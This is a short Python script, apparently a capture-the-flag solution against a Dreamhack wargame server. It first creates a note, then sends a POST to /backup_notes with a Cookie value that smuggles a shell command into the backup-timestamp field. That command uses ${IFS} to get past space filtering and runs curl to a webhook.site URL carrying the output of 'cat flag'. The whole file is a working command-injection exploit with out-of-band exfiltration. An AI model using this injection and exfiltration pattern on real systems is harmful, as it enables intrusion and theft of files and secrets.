import requests

site = "http://host1.dreamhack.games:21876"
url_create_note = f"{site}/create_note"
data_create_note = {
    "content": "anythin"
}

response_create_note = requests.post(url_create_note, data=data_create_note)
print("Create Note Response:")
print("Status Code:", response_create_note.status_code)
print("Response Body:", response_create_note.text)

url = f"{site}/backup_notes"
headers = {
    "Cookie": "backup-timestamp= | curl${IFS}https://webhook.site/61bd85ed-2ec1-4963-8d28-0129a93ec06a/?c=`cat${IFS}flag`",
}
response = requests.post(url, headers=headers)
print("Status Code:", response.status_code)
print("Response Body:", response.text)
